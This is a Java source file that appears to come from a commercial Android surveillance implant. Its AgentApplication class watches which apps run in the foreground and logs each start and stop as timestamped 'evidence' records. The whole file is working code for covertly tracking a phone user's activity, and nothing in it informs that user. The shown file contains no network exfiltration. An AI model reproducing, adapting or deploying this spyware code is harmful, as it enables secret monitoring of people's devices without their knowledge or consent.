package com.ht.RCSAndroidGUI.agent;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;
import java.util.TreeMap;

import android.app.ActivityManager.RunningAppProcessInfo;
import android.util.Log;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.RunningProcesses;
import com.ht.RCSAndroidGUI.evidence.Evidence;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerProcess;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DateTime;
import com.ht.RCSAndroidGUI.util.Utils;
import com.ht.RCSAndroidGUI.util.WChar;

public class AgentApplication extends AgentBase implements Observer<RunningProcesses> {
	private static final String TAG = "AgentApplication";

	TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
	TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();

	@Override
	public boolean parse(AgentConf conf) {
		return true;
	}

	@Override
	public void go() {

	}

	@Override
	public void begin() {
		ListenerProcess.self().attach(this);
	}

	@Override
	public void end() {
		ListenerProcess.self().detach(this);
	}

	public int notification(RunningProcesses processes) {
		ArrayList<RunningAppProcessInfo> list = processes.getProcessList();
		if (list == null) {
			return 0;
		}
		currentRunning.clear();

		for (Iterator iterator = list.iterator(); iterator.hasNext();) {
			RunningAppProcessInfo running = (RunningAppProcessInfo) iterator.next();
			if (running.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {

				currentRunning.put(running.processName, running);
				if (!lastRunning.containsKey(running.processName)) {
					Log.d("QZ", TAG + " (notification): started " + running.processName);
					saveEvidence(running, true);
				} else {
					lastRunning.remove(running.processName);
				}
			}
		}

		for (Iterator iter = lastRunning.keySet().iterator(); iter.hasNext();) {
			RunningAppProcessInfo norun = (RunningAppProcessInfo) lastRunning.get(iter.next());
			Log.d("QZ", TAG + " (notification): stopped " + norun.processName);
			saveEvidence(norun, false);
		}

		lastRunning = new TreeMap<String, RunningAppProcessInfo>(currentRunning);

		return 0;
	}

	private void saveEvidence(RunningAppProcessInfo process, boolean starting) {
		Check.requires(process != null, "null process");

		String name = process.processName;
		String module = process.processName;

		final byte[] tm = (new DateTime()).getStructTm();

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(WChar.getBytes(name, true));
		items.add(WChar.getBytes(starting ? "START" : "STOP", true));
		items.add(WChar.getBytes(module, true));
		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

		LogR log = new LogR(EvidenceType.APPLICATION);
		log.write(items);
		log.close();
	}

}
